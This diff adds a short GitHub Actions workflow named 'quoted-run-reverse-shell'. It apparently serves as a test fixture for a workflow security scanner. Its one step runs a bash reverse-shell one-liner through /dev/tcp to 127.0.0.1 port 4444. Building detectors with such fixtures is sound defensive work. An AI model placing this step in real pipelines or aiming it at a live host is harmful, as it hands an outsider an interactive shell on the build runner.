@@ -1,0 +1,12 @@
+name: quoted-run-reverse-shell
+on: push
+permissions:
+  contents: read
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    permissions:
+      contents: read
+    steps:
+      - "run": bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
